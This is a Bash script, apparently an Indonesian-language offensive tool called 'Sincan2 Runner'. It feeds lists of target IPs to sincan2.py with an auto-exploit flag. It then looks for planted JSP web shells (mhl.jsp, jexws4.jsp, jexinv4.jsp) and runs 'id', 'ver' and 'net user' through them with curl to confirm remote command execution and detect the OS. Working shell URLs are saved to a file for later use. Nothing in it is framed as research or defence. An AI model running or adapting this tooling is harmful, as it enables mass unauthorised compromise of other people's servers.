#!/bin/bash

# =================================================================
# Sincan2 Interactive Runner
# Author: MHL TEAM
# Version: 4.3 (OS Detection & Smart URL Saving)
# Deskripsi: Menambahkan deteksi OS (Linux/Windows) saat verifikasi
#             dan menyimpan URL shell yang siap pakai.
# =================================================================

# --- Definisi Warna ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- Fungsi untuk menampilkan menu utama ---
function show_menu() {
    clear
    echo -e "${YELLOW}==================== SINCAN2 RUNNER MENU ====================${NC}"
    echo -e ""
    echo -e "  ${CYAN}[1]${NC} 🎯  Pindai Target Tunggal (Interaktif)"
    echo -e "  ${CYAN}[2]${NC} 📂  Pindai Massal & Masuk Shell (Berhenti di tiap sukses)"
    echo -e "  ${CYAN}[3]${NC} 🚀  ${GREEN}Pindai Massal, Cek OS, & Simpan Hasil (Otomatis)${NC}"
    echo -e ""
    echo -e "  ${RED}[4]${NC} 🚪  Keluar"
    echo -e ""
    echo -e "${YELLOW}============================================================${NC}"
}

# --- Fungsi Verifikasi UID/OS dan Simpan Hasil ---
function verify_uid_and_save() {
    local output="$1"
    local result_file="shell_berhasil_uid.txt"

    echo "$output" | grep -o 'http[s]*://[^ ]*\(mhl.jsp\|jexws4.jsp\|jexinv4.jsp\)' | while read -r shell_url; do
        if [[ -z "$shell_url" ]]; then continue; fi

        echo -e "${CYAN}  -> Shell ditemukan di: $shell_url${NC}"
        echo -e "${YELLOW}  -> Mencoba verifikasi OS (Linux/Windows)...${NC}"

        # ### PERUBAHAN DIMULAI DI SINI: LOGIKA DETEKSI OS ###
        local linux_check_output
        linux_check_output=$(curl -L -s --connect-timeout 5 "${shell_url}?ppp=id")

        if echo "$linux_check_output" | grep -q "uid="; then
            # Ini adalah sistem Linux
            echo -e "${GREEN}  ✅ VERIFIKASI LINUX BERHASIL! Ditemukan 'uid='.${NC}"
            echo -e "      Output: $(echo "$linux_check_output" | grep "uid=" | head -n 1)"
            
            local url_to_save="${shell_url}?page=id" # Format URL untuk Linux
            
            if ! grep -q -x -F -- "$url_to_save" "$result_file" 2>/dev/null; then
                echo "$url_to_save" >> "$result_file"
                echo -e "${GREEN}  -> URL Shell (Linux) disimpan ke '$result_file'.${NC}"
            else
                echo -e "${YELLOW}  -> URL sudah ada di '$result_file'. Tidak disimpan ulang.${NC}"
            fi
        else
            # 'uid=' tidak ditemukan, coba cek untuk Windows
            echo -e "${YELLOW}  -> 'uid=' tidak ditemukan. Mencoba verifikasi Windows dengan 'ver'...${NC}"
            local windows_check_output
            windows_check_output=$(curl -L -s --connect-timeout 5 "${shell_url}?ppp=ver")

            if echo "$windows_check_output" | grep -i -q "Windows"; then
                 # Ini adalah sistem Windows
                echo -e "${GREEN}  ✅ VERIFIKASI WINDOWS BERHASIL! Ditemukan 'Windows'.${NC}"
                echo -e "      Output: $(echo "$windows_check_output" | grep -i "Windows" | head -n 1)"

                local url_to_save="${shell_url}?cmd=net user" # Format URL untuk Windows

                if ! grep -q -x -F -- "$url_to_save" "$result_file" 2>/dev/null; then
                    echo "$url_to_save" >> "$result_file"
                    echo -e "${GREEN}  -> URL Shell (Windows) disimpan ke '$result_file'.${NC}"
                else
                    echo -e "${YELLOW}  -> URL sudah ada di '$result_file'. Tidak disimpan ulang.${NC}"
                fi
            else
                # Bukan Linux atau Windows yang terdeteksi
                echo -e "${RED}  ❌ VERIFIKASI GAGAL. 'uid=' atau 'Windows' tidak ditemukan di output.${NC}"
            fi
        fi
        # ### PERUBAHAN SELESAI ###
    done
}


# --- Fungsi untuk Opsi Massal ---
function mass_scan_logic() {
    local mode=$1 # 'interactive' atau 'batch'
    local filename port timeout=5 extra_flags=""

    echo -e "\n--- 📂 Pindai Massal dari File ---"
    read -p "  Masukkan nama file list target (contoh: koped.txt): " filename
    if [[ -z "$filename" ]]; then echo -e "${RED}Error: Nama file tidak boleh kosong!${NC}"; sleep 2; return; fi
    if [ ! -f "$filename" ]; then echo -e "${RED}Error: File '$filename' tidak ditemukan!${NC}"; sleep 2; return; fi

    # Prompt Port diperbarui untuk kejelasan
    echo -e "  Masukkan port default (HANYA untuk IP tanpa port di file)."
    read -p "  (Kosongkan jika semua target di file sudah punya port): " port

    read -p "  ⏱️  Berapa lama timeout? (default: 5 detik, tekan enter): " user_timeout
    timeout=${user_timeout:-5}
    read -p "  🔬  Aktifkan pemindaian modern (CVE)? (y/n, default: y): " modern_scan
    if [[ ! "$modern_scan" =~ ^[Nn]$ ]]; then extra_flags+=" -M"; fi

    extra_flags+=" --auto-exploit"
    if [[ "$mode" == "batch" ]]; then
        extra_flags+=" --batch-mode"
        echo -e "${GREEN}Mode 'Verifikasi Otomatis' diaktifkan. Tidak akan masuk ke shell interaktif.${NC}"
    fi

    mapfile -t all_lines < <(tr -d '\r' < "$filename")
    total_ips=${#all_lines[@]}
    if [ "$total_ips" -eq 0 ]; then echo -e "\n${YELLOW}⚠️ File '$filename' kosong.${NC}"; sleep 2; return; fi

    echo -e "\n${GREEN}🔍 Siap memindai ${total_ips} target dari file '${filename}'${NC}"
    echo -e "Tekan [ENTER] untuk memulai..."
    read

    local processed_count=0
    for line_raw in "${all_lines[@]}"; do
        line=$(echo -n "$line_raw" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
        if [[ -z "$line" ]]; then continue; fi

        ((processed_count++))
        local target_url

        # ======================================================================
        # === ⭐ LOGIKA PARSING BARU UNTUK MENANGANI PORT BERVARIASI ⭐ ===
        # ======================================================================
        if [[ "$line" =~ ^https?:// ]]; then
            # 1. Jika sudah URL lengkap (http://ip:port), langsung gunakan.
            target_url="$line"
        elif [[ "$line" == *":"* ]]; then
            # 2. Jika ada tanda ':' (format ip:port), tambahkan http:// di depan.
            target_url="http://$line"
        elif [[ -n "$port" ]]; then
            # 3. Jika hanya IP dan port default diisi, gabungkan.
            target_url="http://$line:$port"
        else
            # 4. Jika hanya IP dan tidak ada port default, lewati dengan error.
            echo -e "${RED}Error: Port wajib diisi untuk IP '$line', karena tidak ada port default yang diset. Lanjut...${NC}"
            sleep 1
            continue
        fi
        # ======================================================================

        local final_command="python3 ./sincan2.py -u \"$target_url\" --timeout $timeout$extra_flags"

        echo -e "\n${BLUE}===========================================================${NC}"
        echo -e "${CYAN}[$processed_count/$total_ips] Memindai target: $target_url${NC}"
        echo -e "${BLUE}===========================================================${NC}"

        if [[ "$mode" == "batch" ]]; then
            scan_output=$(eval "$final_command" | tee /dev/tty)
            verify_uid_and_save "$scan_output"
        else
            eval "$final_command"
        fi

        grep -v -x -F -- "$line" "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
        echo -e "${YELLOW}🧹 Entri '$line' telah diproses dan dihapus dari '$filename'.${NC}"

        if [[ "$mode" == "interactive" ]]; then
            echo -e "\nTekan [ENTER] untuk melanjutkan ke target berikutnya, atau Ctrl+C untuk berhenti..."
            read
        fi
    done

    echo -e "\n${GREEN}✅ Semua target dalam file telah selesai dipindai. Tekan [ENTER] untuk kembali ke menu.${NC}"
    read
}

# --- Loop Utama Skrip ---
if [ ! -f "sincan2.py" ]; then echo -e "${RED}Error: File 'sincan2.py' tidak ditemukan.${NC}"; exit 1; fi

while true; do
    show_menu
    read -p "  Pilih opsi [1-4]: " choice
    case $choice in
        1)
            echo -e "\n--- 🎯 Pindai Target Tunggal ---"
            read -p "Masukkan URL target lengkap (contoh: http://127.0.0.1:8080): " single_target
            if [[ -n "$single_target" ]]; then
                python3 ./sincan2.py -u "$single_target" --auto-exploit -M
                echo -e "\nTekan [ENTER] untuk kembali..."
                read
            fi
            ;;
        2) mass_scan_logic "interactive" ;;
        3) mass_scan_logic "batch" ;;
        4) echo -e "\n${GREEN}Terima kasih telah menggunakan Sincan2 Runner! Sampai jumpa!${NC}\n"; exit 0 ;;
        *) echo -e "\n${RED}Pilihan tidak valid. Silakan coba lagi.${NC}"; sleep 1 ;;
    esac
done
